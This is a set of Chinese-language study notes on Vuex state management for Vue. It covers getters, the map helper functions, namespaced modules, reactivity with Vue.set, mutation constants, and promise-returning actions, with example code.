那如何将个数的需求 定义成一个getters中的方法呢?
比如通过这样的方式获得 <p>{{$store.getters.calcLength}}</p>

```js 
// 我们可以这样
getters: {
  powerCounter(state) {
    return state.counter * state.counter;
  },

  calc(state) {
    return state.students.filter(item => item.age > 10);
  },

  // 定义一个新的方法
  calcLength(state) {
    return state.students.filter(item => item.age > 10).length;
  }
}

// 上面的代码中都有return state.students.filter(item => item.age > 10)这么

// 在 getters 对象中的方法中, 还有第二个参数 getters 就代表了 getters对象 所以我们还可以这么写
getters: {
  powerCounter(state) {
    return state.counter * state.counter;
  },

  calc(state) {
    return state.students.filter(item => item.age > 10);
  },


  // 通过getters拿到calc属性 得到它的length
  calcLength(state, getters) {
    return getters.calc.length;
  }
}
```

<br>

### **总结:**
getters对象中的方法的参数 除了state 还有 getters getters参数代表这个对象本身, 方便我们通过getters.的方法获取别的getters对象中的其它属性
  
<br><br>

**需求3:**  
我希望得到 state中students 年龄大于 age 的 这个age是别人在用getters的时候传递进来的
```js 
getters: {
  calc(state) {
    return state.students.filter(item => item.age > 10);
  }
}

// 上面的 item.age > 10 是写死的 我希望别人在使用的时候 传递一个age过来做判断
<p>{{$store.getters.calc(10)}}</p>

// 但是 getters 中的方法的参数 只有固定的state getters 不接受传递其它的参数 我们里面传递(state, getters, age) 这种方式不行
calc(state) {
    return state.students.filter(item => item.age > 10);
  }

// 那怎么解决 我们返回一个函数
test(state) {
  return function(age) {     // 我们在这里传递age形参
    return state.students.filter(item => item.age > age)
  }
}

// 因为 getters 的test属性 我们返回的是一个函数 函数可以加小括号调用 那么就可以传递参数
<p>{{$store.getters.test(10)}}</p>

// 实际例子中
<p>{{$store.getters.calc(20)}}</p>
<p>{{$store.getters.calc(20)[0].name}}</p>
```

**技巧:**
getters中传参还能利用 高阶函数的功能 详看 *需求3*

<br>

### mapState, mapGetters
**使用地点: 在 computed 中使用的方法**

我们使用 store 的数据 如果要在模板中使用前面都要加上 
```js
$store.state.sum
```

当模板中要很多地方都要使用vuex中的数据的话 那可能就会写很多的重复的代码 
```js
$store.state.xxx
```

那有没有什么办法能够帮我们解决写$store.state这部分的代码呢？ vuex中给我们提供了很多类似的 创建模板代码的函数 

<br>

### **mapState()**
作用: 帮助我们在模板中使用vuex中的数据的时候 可以不用再写 $store.state 的功能
```js 
// 可以精简成这样
$store.state.sum   -- >   sum
```

<br>

### **要点:**
1. mapState() 生成的结果是一个对象类型
2. mapState() 要放在计算属性 computed 中

其实我们也可以自己使用computed来完成这个逻辑 只是这样做很麻烦 vuex 给我们提供了方法 然后我们在模板中是不是可以直接使用 sum 了
```js 
  // 自己使用计算属性完成
  computed: {
    sum() {
      return this.$store.state.sum
    }
  }
```

<br>

### **mapState的使用方式:**

**引入:**  
```js
import {mapState} from 'vuex'
```

<br>

**在 computed 中使用 ...mapState({}) 函数**  
借助mapState生成计算属性 从state中读取数据

我们看看参数对象的使用方式:

**<font color="#C2185B">方式一: 对象写法</font>**  
我们传入 ...mapState() 中一个对象 对象中是 key value 的形式  
通过 key 和 value 做 组件要使用的变量 和 state 中的变量进行映射

```js
mapState({
  // value的部分要加上引号
  组件中想要使用的变量名: 'vuex中想要使用的数据de Key',    
  组件中想要使用的变量名: 'vuex中想要使用的数据de Key',
})  
```

```js
// value的部分还可以是一个函数
mapState({
  我们在组件中想要使用的变量名: state => state.它内部的数据,    
  我们在组件中想要使用的变量名: state => state.它内部的数据,    
})  
```

**注意:**  
1. 这里不能因为我们想起的名字和state中的数据名一致 就使用es6的简写模式
2. vm变量名就是我们要在模板中使用的变量 它用来映射state中的数据
3. kv v的部分属于state中定义的数据 一定要加上""
4. 当 v 使用函数的写法的时候 就是通过 state 去读vuex中我们想要使用的数据
5. 脚本里面想要使用 数据的时候 我们还是要通过 this. 的方式

<br>

### **要点:**
mapState()本身就是一个对象 放在计算属性中的时候 要使用...来解构
使用这个方式本质也是利用了计算属性 也是使用了计算属性 但是优点就是mapState vue开发者工具能够观察到 是state中的数据
```js 
  computed: {

    // 要点在这 ...
    ...mapState({

      // 函数的方式 和 字符串的方式 相同
      school: state => state.school
      school: 'school',

      ---

      subject: 'subject',
    })
  }

  -----

  state: {
    msg: "我是store中的数据: hello, vuex"
  },

  computed: {
    // 字符串 和 函数 的结果都一样
    ...mapState({msg: state => state.msg})
  },
  mounted() {
    // 这里还是要使用 this
    console.log(this.msg)
  }


  <div>mapState: {{msg}}</div>
```

<br>

**<font color="#C2185B">方式二: 数组写法</font>**  
从上面的例子我们能看见我们写了
```
school: 'school', subject: 'subject'
```

在使用mapState()传递参数的时候 我们还可以传递一个数组进去

<br>

**作用:**  
当我们想使用的变量名 和 store 中保存数据的*变量名一致*的时候 我们可以使用数组的写法 state定义的是num 组件里我也想起名叫做num
```js 
computed: {
  ...mapState(["num"])
}
```

<br>

### **...mapGetters({} || [])**
getters的用法跟上面的一样 也是两种写法  
作用: 用于帮助我们映射getters中的数据为计算属性

```js
import {mapState, mapGetters} from "vuex"

computed: {
  ...mapState(["msg"]),

  ...mapGetters(["process"])
  ...mapGetters({process: "process"})
}

<div>mapState: {{msg}}</div>
<div>mapGetters: {{process}}</div>
```

<br><br>

### mapActions, mapMutations
在 methods 中使用的方法
使用方式几乎和上面的一样 也是通过 mapActions, mapMutations 来帮助我们生成重复性的代码

**mapMutations mapActions 都是写在 methods 配置项中**

<br>

### **...mapMutations()**
我们在使用 commit() 向 mutations 中提交的时候都会在组件中对应的处理函数里写提交到Mutations的逻辑
```js  
  methods: {
    inc() {
      this.$store.commit('add', this.n)
    },

    dec() {
      this.$store.commit('dev', this.n)
    }
  }
```

我们也可以通过 mapMutations 帮助我们省略 this.$store.commit 的代码 向 Mutations 中提交

<br>

### 使用方式:
**1. 引入:**  
```js
import {mapActions} from 'vuex'
```

<br>

**2. 模版中定义button的回调 回调中传入 actions 中函数的 type 和 data**

原来我们在组件中 使用如下的方法 将处理逻辑 dispatch 到 actions 中 并在 下面的逻辑中指定了 type data
```js
this.$store.dispatch(type, data)
```

但是使用 ...mapActions() 的时候 不是在this.$store.dispatch(type, data) 指定 type 和 data 而是在 html 模版中 定义 button 回调的时候 button的回调名就是type data是通过实参传入
```html
<button 
  <!-- 这这里就指定 type data 了 modify就是actions中的函数名-->
  @click="modify('我是修改后的Vuex数据: erin')">
  click
</button>
```

<br>

**3. 在 methods 配置项中 使用 ...mapActions({})**  
**<font color="#C2185B">方式一: 对象写法</font>**  
对象中是一组组的 key: value

key     指定的是模版中 组件内methods中定义的button的回调名  
value   指定的是actions对象中定义方法名  

```html
<!-- modify() 就是 key -->
<button 
  @click="modify('我是修改后的Vuex数据: erin')">
  click
</button>
```

```js
methods: {
  /*
    以前的写法
    modify() {
      this.$store.dispatch("modifyState", "我是修改后的Vuex数据: erin")
    },
  */

  // mapActions的写法 -- modifyState就是value 也是actions对象中配置好的方法名
  ...mapActions({modify: "modifyState"})
},
```

<br>

**<font color="#C2185B">方式二: 数组写法</font>**  
当组件内部模版中的回调方法名 和 actions 或 mutations 一致的时候 可以使用该方式 

### **...mapActions(["方法名"])**
```js 
  // vuex内
  mutations: {
    modify(state, data) {
      state.msg = data
    }
  },
  actions: {
    modify({commit}, data) {
      commit("modify", data)
    }
  },


  // 都是 modify 的情况下使用 数组的方式
  methods: {
    ...mapActions(["modify"])
  },

  //
  <button 
    @click="modify('我是修改后的Vuex数据: erin')">
    click
  </button>
```

<br>

**4. 传递参数的时候 要在模板中传递**
要在模板中调用处理函数的时候传入参数
```js 
  <li @click='modify("我是修改后的Vuex数据: erin")'> + </li>
```

<br>

**注意:**
数组的写法多用在函数名一样的时候 函数名不一样的时候只能使用对象的写法

<br>

### Vuex Store中的 modules 配置项
vuex的模块化编码

在上面的案例中 我们将state actions mutations getters都写在了一个indexjs文件里面 当每一个功能块中的逻辑越来越多的时候就不好管理了

我们的目标是actions mutations中的逻辑我们按照不同分类的将它们整理好

```js 
  // 求和功能相关的配置
  const countOptions = {
    actions: {},
    mutations: {},
    getters: {}
  }

  // 人员管理功能相关的配置
  const personsOptions = {
    actions: {},
    mutations: {},
    getters: {}
  }
```

上面完全形成了两套配置 也就是说写求和相关的程序员动第一套配置 写人员管理的程员动第二套配置

那 new Vuex.Store({ ... }) 怎么写呢？

**当我们要使用 多套 配置的情况下 就要使用 modules 模块配置项**

<br>

### **配置项: modules **
它的类型是一个对象 代码可以选择多组配置 使用该配置项后 store 中的配置开始按照我们的配置项分类了

**注意:**  
在使用modules的时候 我们上面定义的 **每一个配置对象里面必须要加上** 一个如下属性 便于 mapState系列的方法识别
```js
namespaced: true  -- 开启命名空间 
```

```js 
  // 求和功能相关的配置
  const countOptions = {
    namespaced: true      --- // 这里
    actions: {},
    mutations: {},
    getters: {}
  }

  // 人员管理功能相关的配置
  const personsOptions = {
    namespaced: true      --- // 这里
    actions: {},
    mutations: {},
    getters: {}
  }


  new Vuex.Store({
    // 模块a 和 模块b
    modules: {
      a: countOptions,
      b: personsOptions
    }
  })

  // 它就像将store里面分成了两个配置
  store: {
    a: {
      actions,
      mutations,
      state
    },

    b: {
      actions,
      mutations,
      state
    }
  }
```

换句话说我们每一个 actions mutations 里面都分为了 a配置 和 b配置

<br>

### **设置成 模块化 后的 使用方式:**
**1. store文件中 各套配置 在配置对象中 添加 namespaced: true 属性**   
```js
// 输出信息的 store
const infoOptions = {

  // 添加 namespaced
  namespaced: true,
  state: {
    msg: "我是info模块中的数据哦"
  },
  actions: {
    modify({commit}, data) {
      commit("modify", data)
    }
  },
  mutations: {
    modify(state, data) {
      state.msg = data
    }
  }
}


// 数字累加的 store
const countOptions = {

  // 添加 namespaced
  namespaced: true,
  state: {
    count: 1
  },
  actions: {
    add({commit}, data) {
      commit("add", data)
    }
  },
  mutations: {
    add(state, data) {
      state.count += data
    }
  }
}
```

<br>

**2. 在 Store 配置对象中 使用 modules 配置项 并指定 模块名**
```js
export default new Vuex.Store({
  modules: {
    // 指定模块名 count
    count: countOptions,
    // 指定模块名 info
    info: infoOptions
  }
})
```

<br>

**3. 模版中使用 模块化后的 state 中的数据**  
格式: $store.state.模块名.数据

state中的数据的演示 getters 则不一样
```html
<div>
  info/msg: {{$store.state.info.msg}}
</div>
<div>
  count/count: {{$store.state.count.count}}
</div>

<button @click="modify">modify</button>
<button @click="add">add</button>
```

<br>

**3. 模版中使用 模块化后的 getters 中的数据**  
我们在读取模块化后的state中的数据的时候 是通过如下的方式
```js
this.$store.state.a.sum
```

a是modules里面的一个模块 但是我们在读取getters中的数据的时候 不是像上面那么写的
```js
// 读取 getters 的时候 不能再按照 getters.模块.变量的形式读取
this.$store.getters.a.sum 
```

如上的这么写是不对的 因为modules/getters里面并不是这么设计的

当我们使用了模块后 state 中的数据接口如下 所以我们能 **state.模块.变量** 来读取
```js
state: {
  a:{sum: 0}
  b:{name: '张三'}
}
```

但是getters中的数据结构不是这样的 而是如下 相当于把模块对应的变量都整合到了 getters 对象里面

```js 
  getters: {
    a/sum: 0,
    b/name: '张三'
  }
```

所以我们在模块化后 读取 getters 中的数据的时要这么写 

<br>

### 读取 模块化后的 getters 中的数据如下
**<font color="#C2185B">this.$store.getters["模块名/变量"]</font>**  
```js
this.$store.getters["info/msg"]
```

<br>

**4. script部分 使用 dispatch 分发到 指定模块中的指定方法**
格式: dispatch("模块名/指定方法")

```js
methods: {
  modify() {
    this.$store.dispatch("info/modify", "我是修改后的数据哦")
  },
  add() {
    this.$store.dispatch("count/add", 1)
  }
}
```

<br>

**完整代码:**
```js
// store.js
import Vue from 'vue'
import Vuex from 'vuex'

Vue.use(Vuex)

// 输出信息的 store
const infoOptions = {
  namespaced: true,
  state: {
    msg: "我是info模块中的数据哦"
  },
  actions: {
    modify({commit}, data) {
      commit("modify", data)
    }
  },
  mutations: {
    modify(state, data) {
      state.msg = data
    }
  }
}

// 数字累加的 store
const countOptions = {
  namespaced: true,
  state: {
    count: 1
  },
  actions: {
    add({commit}, data) {
      commit("add", data)
    }
  },
  mutations: {
    add(state, data) {
      state.count += data
    }
  }
}

export default new Vuex.Store({
  modules: {
    count: countOptions,
    info: infoOptions
  }
})

// 组件内部代码
<template>
  <div>
    <h3>App组件</h3>
    <hr>
    <div>
      info/msg: {{$store.state.info.msg}}
    </div>
    <div>
      count/count: {{$store.state.count.count}}
    </div>
    <hr>
    <button @click="add">add</button>
    <button @click="modify">modify</button>
  </div>
</template>

<script>
import {mapState, mapGetters, mapMutations, mapActions} from "vuex"
export default {
  mounted() {
    console.log(this.$store)
  },
  methods: {
    modify() {
      this.$store.dispatch("info/modify", "我是修改后的数据哦")
    },
    add() {
      this.$store.dispatch("count/add", 1)
    }
  }
}
</script>
```

<br><br>

# **使用 map系列 操作 模块化后的 store**

### **...mapState()的使用方式:**
**<font color="#C2185B">方式1: ...mapState(["模块1名"[, "模块2名"]])</font>**  
相当于解构出 模块, 然后模版中通过 模块.变量的形式调用数据
```js
computed: {
  ...mapState(["info", "count"])
}
```

```html
<div>
  info/msg: {{info.msg}}
</div>
<div>
  count/count: {{count.count}}
</div>
```

<br>

**<font color="#C2185B">方式2: ...mapState("模块名", ['变量名'])</font>**  
**数组形式:** 当我们要映射的变量名 和 store 中的数据一致的时候可以这么使用
```js
...mapState("info", ['msg'])

// 页面中直接使用 msg 变量名 不需要 模块.变量名
<div>
  info/msg: {{msg}}
</div>
```

**对象形式:** 需要另起变量名的时候使用
```js
...mapState("info", {info: "msg"})

// 页面中直接使用 msg 变量名 不需要 模块.变量名
<div>
  info/msg: {{msg}}
</div>
```

<br>

### **...mapActions()的使用方式:**
**<font color="#C2185B">方式1: ...mapActions("模块名", ["方法名"])</font>**  
在 methods 配置项中使用

**数组形式:** 当 组件中 事件回调 & actions & mutations 中的方法名一致的时候可以使用数组方法

指定的 方法名 还是作为 button 的回调type 参数data通过回调的实参传递

下面的使用方式 我们能发现 下面3个都是 add()
```js
<button @click="add(1)">

actions: {
  add() { ... }
},
mutations: {
  add() { ... }
}
```

```html
<template>
  <div>
    <h3>App组件</h3>
    <hr>
    <div>
      info/msg: {{msg}}
    </div>
    <div>
      count/count: {{count}}
    </div>
    <hr>
    <button @click="add(1)">add</button>
    <button @click="modify('修改后的数据')">modify</button>
  </div>
</template>

<script>
import {mapState, mapGetters, mapMutations, mapActions} from "vuex"
export default {
  computed: {
    ...mapState("info", ['msg']),
    ...mapState("count", ["count"])
  },
  methods: {
    ...mapActions("count", ["add"]),
    ...mapActions("info", ["modify"]),
  }
}
</script>


<script>
// store.js
import Vue from 'vue'
import Vuex from 'vuex'

Vue.use(Vuex)

// 输出信息的 store
const infoOptions = {
  namespaced: true,
  state: {
    msg: "我是info模块中的数据哦"
  },
  actions: {
    modify({commit}, data) {
      commit("modify", data)
    }
  },
  mutations: {
    modify(state, data) {
      state.msg = data
    }
  }
}

// 数字累加的 store
const countOptions = {
  namespaced: true,
  state: {
    count: 1
  },
  actions: {
    add({commit}, data) {
      commit("add", data)
    }
  },
  mutations: {
    add(state, data) {
      state.count += data
    }
  }
}

export default new Vuex.Store({
  modules: {
    count: countOptions,
    info: infoOptions
  }
})

</script>
```

<br>

**<font color="#C2185B">方式2: ...mapActions("模块名", {组件内回调: "actions中的方法名"})</font>**  
在 methods 配置项中使用

**对象形式:** 当组件内部回调的方法名 和 actions 定义的方法名不一致的时候 我们使用对象的形式

```
当我们进行模块化编码的时候 我们有两套配置

那么我们在进行 dispatch 和 commit 的时候就要让vuex知道我们是往哪个配置中对应的函数中分发和处理 还是一一对应的关系 所以我们也要先指定具体的配置
```

<br><br> 

### **...mapGetters()的使用方式:**

**<font color="#C2185B">...mapGetters("模块名", ["getters中的属性名"])</font>**  
```js
<h3>{{listLen}}</h3>

computed: {
  ...mapGetters("goods", ["listLen"])
},
```

<br><br>

### **教学视频中的代码:**

```js 
  // index js 文件
  import Vue from "vue"
  import Vuex from "vuex"

  Vue.use(Vuex)

  // const state = {
  //   num: 0
  // }

  // 单独
  /* 
  const actions = {
    inc(context, value) {
      let {commit} = context
      commit("inc", value)
    }
  }

  const mutations = {
    inc(state, value) {
      state.num += value
    }
  } 
  */

  const incModule = {
    namespaced: true,
    state: {
      num: 0,
    },
    actions: {
      inc(context, value) {
        let {commit} = context
        commit("inc", value)
      }
    },
    mutations: {
      inc(state, value) {
        state.num += value
      }
    }
  }

  const decModule = {
    namespaced: true,
    state: {
      num: 100
    },
    actions: {
      dec(context, value) {
        let {commit} = context
        commit("dec", value)
      }
    },
    mutations: {
      dec(state, value) {
        state.num -= value
      }
    }
  }


  const modules = {
    a: incModule,
    b: decModule
  }

  const store = new Vuex.Store({
    // state,
    modules
  })

  export default store


  // app文件
  <template>
    <div id='app'>
      <span>{{a.num}}</span> --- 
      <span>{{b.num}}</span>
      <button @click="handelInc(target)">add</button>
      <button @click="handelDec(target)">jian</button>
    </div>
  </template>

  <script>
  import {mapState} from "vuex"
  import {mapMutations} from "vuex"

  export default {
    name: 'App',
    data() {
      return {
        target: 10,
      }
    },
    created() {
      console.log("我是App组件")
    },
    methods: {
      // handelInc() {
      //   this.$store.dispatch("inc", this.target)
      // }

      ...mapMutations("a", {handelInc: "inc"}),
      ...mapMutations("b", {handelDec: "dec"})
    },
    computed: {
      // ...mapState(["num"])
      ...mapState(["a", "b"])
    },


  }
  </script>
```

<br><br>

# vuex-state单一状态树的理解
### **单一状态树的概念:**
Vuex提出使用单一状态树, 什么是单一状态树?
英文名字 Single Source of Truth, 也可以翻译成单一数据源

我们用一个生活中的例子做一个简单的类比 在国内我们有很多的信息需要被记录, 比如上学时的个人档案, 工作后的社保记录, 公积金记录, 结婚后的婚姻信息, 以及其他相关的户口 医疗 文凭 房产记录等

这些信息被分散在很多地方进行管理, 有一天你需要办理某个业务时(比如入户某个城市) 你会发现你需要到各个对应的工作地点去打印 盖章各种资料信息, 最后到一个地方提交证明你的信息无误

这种保存信息的方案, 不仅仅低效, 而且不方便管理, 以及日后的维护也是一个庞大的工作(需要大量的各个部门的人力来维护, 当然国家目前已经在完善我们的这个系统了)


上面的比喻和我们在应用开发中比较类似

如果你的状态信息是保存到多个store对象中的, 那么之后的管理和维护等等都会变得特别的困难 所以vuex也使用了单一状态树来管理应用层级的全部状态 单一状态树能够让我们最直接的方式找到某个状态的片段, 而且在之后的维护和调试过程中, 也可以非常的方便和管理和维护

```js 
// 上面的意思是, 我们在之前的代码中 只是创建了一个store
const store = new Vuex.Store({})

// 其实还可以跟上面说的情况一样 我可以创建多个
const store1 = new Vuex.Store({})
const store2 = new Vuex.Store({})
const store3 = new Vuex.Store({})

// 但是vue不推荐我们这么做, 而是将所有的状态管理信息放在一个store里面 只要是用到store中东西, 只需要store中的东西 都跟这一个store要就可以 
```

<br><br>

# vuex(mutation) - 数据的响应式原理
也可以说mutation的响应规则

vuex的store中的state是响应式的, 只要是写在state中的属性, 都会被假如响应式的系统里面, 当state的数据发生改变时, vue组件会自动更新

```js 
state: {
  info: {
    name: 'sam',
    age: 18
  }
}
```

我们在vuex的仓库中定义了一个info, 这个info就是响应式的, 假如组件中通过mutations修改了info中的属性的时候, 其它使用了$store.state.info的属性也会跟着发生改变, 这个改变的原理是

info中的每一个属性都对应dep, dep是一个观察的模式 会监听属性的变化 观察数据有没有变化, 一旦发生变化 它会看下有哪些地方是需要根据我们的数据变化去刷新界面的

比如有两个组件引用了info, 那么dep就是一个数组, 数组中 [watcher, watcher]
  
当info中的数据发生变化的情况下, 就会通知数组中的组件让它们也发生对应的变化

```js
info: {
  name: 'sam',    Dep -> watcher
  age: 18         Dep -> watcher
}
```

但是这个响应式是有一定的要求的 要求我们必须遵守一些vuex对应的规则

<br>

### **state中的数据是响应式的前提**
1. 提前在store中初始化好所需的属性
```js 
  // 比如 我们现在在state对象中定义了info
  state: {
    info: {
      name: 'sam',
      age: 18
    }
  }

  /*
    那么上面的info中的name age都是响应式的, 因为初始化的时候这个info就被添加到响应式的系统中

    但是 如果我们通过 mutations updateInfo往info中新添加了一个属性, 虽然info中是添加了一个属性, 但通过这种方式添加的属性, 并不会被加入响应式的系统时, 组件中不会实时更新address
  */
  
  mutations: {
    updateInfo(state) {
      state.info['adress'] = '洛杉矶'
    }
  }

  // 但是有时候我们确定有这种需求, 期望我们新添加进去的属性, 是响应式的可以界面跟着一起刷新
```


2. 当给state中的对象添加新的属性的时候, 使用下面的方式 新添加的属性就会是响应式的  
也就是说 我们使用常规的添加和删除的方式给state对象中添加属性 或者 删除属性并不是响应式的
```js 
  // 常规方法: 下面的常规方法 做不到响应式

  // 添加
  updateInfo(state) {
    state.info['adress'] = '洛杉矶'
  }

  // 删除
  updateInfo(state) {
    delete state.info.age
  }
```

### 注意: 往state中添加数据的时候 要使用 Vue提供的API
**添加:**   
```js
Vue.set(要修改的对象, '属性名', 属性值)
```

<br>

**删除:**   
```js 
Vue.delete(要删除的对象, '属性名')
```

<br>

**用新对象给旧对象重新赋值:**
```js 
// 方式1
mutations: {
  updateInfo(state) {
    Vue.set(state.info, 'address', '洛杉矶')
    Vue.delete(state.info, 'age')
  }
}
```

<br><br>

# Mutations 常量类型
我们来考虑一下下面的问题

在mutation中 我们定义了很多事件类型(也就是其中的方法名称) 当我们的项目增大时, vuex管理的状态越来越多, 需要更新状态的情况越来越多, 那么意味着mutation中的方法就越来越多 方法过多, 使用者需要花费大量的精力去记住这些方法, 甚至是多个文件间的来回切换, 查看方法名称 甚至如果不是复制的时候, 可能还会出现写错的情况 

```js
// vuex 
mutations: {
  updateInfo(state) {
    Vue.set(state.info, 'address', '洛杉矶')
  }
}

// 组件中的方法
this.$store.commit('updateInfo')
```

我们要更改vuex中的状态, 就要通过mutations来进行处理, 但是当我们的项目越来越大mutations中的方法就会越来越多, 不仅需要去记mutations中的事件类型, 还要复制事件类型到组件的commit()中, 这个过程极有可能会出错

vuex建议我们把 mutations中的方法名 放在一个专门放常量的文件中进行管理 这样 mutations 中的方法名 和 组件中的commit都使用一个减小出错的概率


### **具体步骤:**
1. 在store文件夹中, 创建一个mutations-type.js文件
```js
export const INCREMENT = 'increment'
```

2. 分别在store文件夹里面的index.js中, 组件中分别引入并使用该常量
[事件类型]() { ... }

```js 
// 组件
import { INCREMENT } = from './路径'
this.$store.commit(INCREMENT)


// vuex
import { INCREMENT } = from './路径'
[INCREMENT](state) {
  Vue.set(state.info, 'address', '洛杉矶')
}
```

<br><br>

# vuex - actions使用详解:

### **Mutations 同步函数:**
通常情况下, vuex要求我们mutations中的方法必须是同步方法  
主要的原因是我们使用devtools时, devtools可以帮助我们捕捉mutation的快照

但是如果是异步操作, 那么devtools将不能很好的追踪这个操作什么时候会被完成

```js 
mutations: {
  updateInfo(state) {

    // 同步的话, devtools 能很好的捕捉到快照
    Vue.set(state.info, 'address', '洛杉矶')


    // 在mutations中使用异步的时候 devtools 不能捕捉到快照
    setTimeout(() => {
      Vue.set(state.info, 'address', '洛杉矶')
    }, 1000)
  }
}
```

如果是调试程序的时候 视图确实已经被修改, 但是devtools还是之前的值 不起效果了 devtools跟踪不到 相当于里面记录错误的信息

如果确实需要在vuex中进行一些异步操作, 比如网络请求 那么我们就添加一个环节, 那我们就在actions中定义一个方法 方法内部写上异步操作, 然后由actions提交到mutations, 由mutations来进行修改, 当然组件中也是由使用commit提交到mutations改为使用dispatch提交到actions

<br>

### **actions:**
actions 里面也是一些的方法  
actions 中的方法的默认形参是 context(上下文)

这里我们把 形参 context 理解为 store 对象 (const store = new Vuex.Store())

既然context是store对象, 那么store中就会有commit方法, 用户将actions中的操作提交到mutations进行修改


**完整的步骤:**
1. 在组件中异步修改vuex store中的状态变量  
要点: 使用 $store.dispatch 将点击操作 提交到 actions 中处理
```js 
<button @click='updateInfo'>点击按钮修改信息</button>

updateInfo() {
  this.$store.dispatch('aUpdateInfo');
}
```

2. 在action中定义异步操作, 将异步操作 提交到mutations中进行处理  
要点: actions中的方法的参数 是context 可以理解为 store对象 使用context.commit() 提交到mutations中的处理函数
```js 
actions: {
  aUpdateInfo(context) {
    setTimeout(() => {
      context.commit('updateInfo')
    }, 1000)
  }
}
```

3. 最终在mutation中修改vuex管理的状态变量
```js 
mutations: {
  updateInfo(state) {
    state.info.name = 'nn'
  }
}
```

<br>

### **组件 和 action 之间传递参数:**
组件中可以在 dispatch() 中传递参数 在action中的方法的第二个形参中接收
```js 
// 组件
updateInfo() {
  this.$store.dispatch('aUpdateInfo', '我是payload参数');
}

// actions
actions: {
  aUpdateInfo(context, payload) {   // 这来接收组件传递的参数
    setTimeout(() => {
      console.log(payload)
      context.commit('updateInfo')
    }, 1000)
  }
}
```

<br>

### **vuex 结合 promise的使用方式:**
我希望当action中修改成功后能够通知组件修改完成 什么时候修改成功呢? 

actions中使用 context.commit的时候就是成功了, 所在在context.commit()的下面继续写代码就可以了 如果失败就不会执行到 commit下面的代码  
我们可以在组件的 dispatch() 的第二个参数组织成一个对象

```js 
  // 组件
  updateInfo() {

      // 我们将第二个参数整理成对象 里面放参数 和 回调
      this.$store.dispatch('aUpdateInfo', {
        message: '我是参数',
        success: () => {
          console.log('里面已经完成了')
        }
      });
    }


  // actions
  actions: {
    aUpdateInfo(context, payload) {
      setTimeout(() => {

        // 什么时候代表成功 只要commit就会成功 如果不成功就会报错 不会执行到下面
        context.commit('updateInfo')

        // 那就是说? 先mutation里面修改完 然后回调? 成功之后的逻辑可以放在这里
        console.log(payload.message);
        payload.success();
      }, 1000)
    }
  }
```

另一种优雅的做法:  
需求还是跟上面的一样 我希望当action提交mutation修改完成后 通知组件里面逻辑已经完成 这里我们使用promise
```js 
  // actions
  
  actions: {
    aUpdateInfo(context, payload) {

      // 这里 我直接return出去一个 promise 就意味着 组件里接收的也是一个promise对象 可以调用then的方法
      return new Promise((resolve, reject) => {
        setTimeout(() => {

          context.commit('updateInfo', payload)
          console.log(payload);
          
          // 这里还可以传递参数到组件
          resolve('1111');

        }, 1000)
      })
    }
  }


  // 组件: 组件中调用then方法
  updateInfo() {
    this.$store
    .dispatch('aUpdateInfo', '我是组件传递过去的信息')
    .then(res => {
      console.log('里面完成里提交')

      // 打印actions传递过来的参数
      console.log(res)    // 1111
    });
  }
```

优点: 不仅组件可以向actions里面传递参数, actions中还可以向组件里传递参数

**为什么可以在组件中使用then方法?**  
action中 aUpdateInfo 方法 整体的 return了  new Promise对象  
vuex是这样做的 组件中 谁调用了 dispatch('aUpdateInfo') 指向了action中的方法, 那么 promise对象相当于 返回到了组件中

```js 
  aUpdateInfo(context, payload) { return new Promise }

  // 组件使用dispatch到了aUpdateInfo
  this.$store
    .dispatch('aUpdateInfo', '我是组件传递过去的信息')

  // 那么 return new Promise 可以理解为 替换到 this.$store.dispatch('aUpdateInfo', '我是组件传递过去的信息') 这个位置 那就意味着 promise 返回到组件中了
```

弹幕说 dispatch 返回的本来就是promise对象

<br><br>

# vuex - modules的使用详解
上面讲了 state mutation actions getters 还有一个modules, 我们是把所有的状态变量都放在了state中去管理, 但是如果项目越来越大 state 中的变量就会越来越多, 那么就会越来越臃肿

vuex建议我们使用单一状态树, 那么就意味着很多状态都会交给vuex来管理  
当应用变得非常复杂的时候, store对象就有可能变得相当的臃肿  
为了解决这个问题, vuex允许我们将store分割成模块(modules), 而每个模块拥有自己的state mutation actions getter等

```js 
modules: {
  // 定义个模块A
  a: {
    state: {}
    mutations: {}
    actions: {}
    getters: {}
  }

  // 定义个模块b
  b: {
    state: {}
    mutations: {}
    actions: {}
    getters: {}
  }
}
```

<br>

### **在modules中的 state**
我们在访问modules中的state的时候, 通过 $store.state.模块名.模块中属性名

为什么是state.a, 模块a不是在modules里面定义的么 因为vuex解析的时候会把模块a放在state中 
```js 
modules: {
  a: {
    state: {
      name:'erin'
    }
  }
}

// 组件中访问模块中的state的时候
$store.state.a.name
```

<br>

### **在modules中的 mutations**
要点:
1. modules中的 mutations 中的方法的形参 state 是modules中的state 并不是vuex中的state
2. 模块中定义的mutation 组件中也是使用$store.commit()来提交 vuex会先去store实例对象中找 updateName 如果没有会去 modules里去找

```js   
modules: {
  a: {
    state: {
      name:'erin'               也就是这个state中的变量
    },                                    ↑
    mutations: {                          ↑
      updateName(state) {       这里的state是module里面state
        state.name = 'erinnn'
      }
    }
  }
}
```

来个小需求, 组件修改模块中的state中的name, 具体修改什么前端传值
```js 
// 组件
<button @click='updateName'>修改名字</button>
    // 注意 这里并没有传递值 也就是说不是在组件模板中传值的

methods: {
  updateName() {
    this.$store.commit('updateName', 'mmmmm')
      // 我们在这里传递了值, 而且, 也是使用$store.commit提交的 vuex会先去store实例对象中找 updateName 如果没有会去 modules里去找
  }
}


// vuex中的modules里
mutations: {
  // 定义payload接收组件传递的参数
  updateName(state, payload) {    
    state.name = payload;
  }
}
```

<br>

### **在modules中的getters**
要点: 组件中使用的时候 也是 通过$store.getters.属性名(方法名) 在modules中的getters中的方法 可以有第三个参数 rootstate 
```js 
getters: {
  fullname(state, getters, rootstate)
}
```

```js 
// modules:
getters: {
  fullname(state) {
    return state.name + 'love sam nn'
  }
}

<p>{{$store.getters.fullname}}</p>
```

需求: 在modules中引用外成state中的属性
```js 
const store = new Vue.Store({
  state: {
    counter: 1000       ← 指向这里
  },
                              ↘
  modules: {
    state: {
      name: 'erin'
    }
    
    getters: {

      // 注意 在 modules 中方法可以有第三个参数 rootstate执行外层store中的state, 必须是第三个参数第二个是getters
      fullname(state, getters, rootstate) {
        return state.name + rootstate.counter
      }
    }
  }
})

// 组件
<p>{{$store.getters.fullname}}</p>
```

**要点: 模块下的getters对象中的函数里面还有 rootstate 第三个参数**

<br>

### **在modules中的 actions**
actions中有一个参数叫context 这个只是modules 模块中的上下文对象 指向的都是模块中的东西

context中还是有很多东西的 有很多实用的属性 可以打印下看看
```js 
// 之前我们都是 这么写
aUpdateName(context) { ... }

